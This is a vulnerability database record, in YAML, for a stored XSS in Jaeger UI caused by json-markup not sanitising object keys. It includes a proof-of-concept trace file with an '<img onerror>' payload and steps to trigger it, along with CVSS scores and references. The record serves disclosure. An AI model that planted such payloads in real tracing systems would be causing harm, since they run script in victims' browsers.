vulnerability_id: VCID-smf5-yt98-aaak
aliases:
  - GHSA-2w8w-qhg4-f78j
summary: "A stored XSS in jaeger UI might allow an attacker who controls a trace to perform\
  \ arbitrary jaeger queries\nRelated UI vulnerability advisory: https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r\n\
  \n### Summary\nJaeger UI is using the `json-markup` dependency to display span attributes\
  \ and resources. This dependency is not sanitising keys of an object though, thus the `KeyValuesTable`\
  \ is vulnerable to XSS. \n\n### Details\nThe vulnerable line is here: https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49\n\
  \n### PoC\n\n1. Start a Jaeger UI\n2. Save the following trace as a file:\n```json\n{\n  \
  \  \"data\": [\n        {\n            \"traceID\": \"076ef819cc06c45a\",\n            \"\
  spans\": [\n                {\n                    \"traceID\": \"076ef819cc06c45a\",\n  \
  \                  \"spanID\": \"076ef819cc06c45a\",\n                    \"flags\": 1,\n\
  \                    \"operationName\": \"and open 'attributes'\",\n                    \"\
  references\": [],\n                    \"startTime\": 1678196149232010,\n                \
  \    \"duration\": 13485,\n                    \"tags\": [\n                        {\n  \
  \                          \"key\": \"sampler.type\",\n                            \"type\"\
  : \"string\",\n                            \"value\": \"{\\\"<img src=x onerror=alert(1)>\\\
  \":\\\"test\\\"}\"\n                        }\n                    ],\n                  \
  \  \"logs\": [],\n                    \"processID\": \"p1\",\n                    \"warnings\"\
  : null\n                }\n            ],\n            \"processes\": {\n                \"\
  p1\": {\n                    \"serviceName\": \"click here\",\n                    \"tags\"\
  : [\n                    ]\n                }\n            },\n            \"warnings\": null\n\
  \        }\n    ],\n    \"total\": 0,\n    \"limit\": 0,\n    \"offset\": 0,\n    \"errors\"\
  : null\n}\n```\n3. Upload that trace to Jaeger UI in order to visualise it.\n4. Open the trace,\
  \ open it's span's attributes.\n5. XSS should be fired.\n\n### Impact\n\nThis is a XSS on\
  \ Jaeger UI. XSS can be used to run JavaScript."
severities:
  - score: '6.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    published_at: None
    url: https://github.com/jaegertracing/jaeger
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/jaegertracing/jaeger
  - score: '6.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    published_at: None
    url: https://github.com/jaegertracing/jaeger/security/advisories/GHSA-2w8w-qhg4-f78j
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/jaegertracing/jaeger/security/advisories/GHSA-2w8w-qhg4-f78j
  - score: '6.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    published_at: None
    url: https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49
  - score: '6.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    published_at: None
    url: https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r
weaknesses:
  - CWE-79
references:
  - url: https://github.com/jaegertracing/jaeger
    reference_type:
    reference_id:
  - url: https://github.com/jaegertracing/jaeger/security/advisories/GHSA-2w8w-qhg4-f78j
    reference_type:
    reference_id:
  - url: https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49
    reference_type:
    reference_id:
  - url: https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r
    reference_type:
    reference_id:
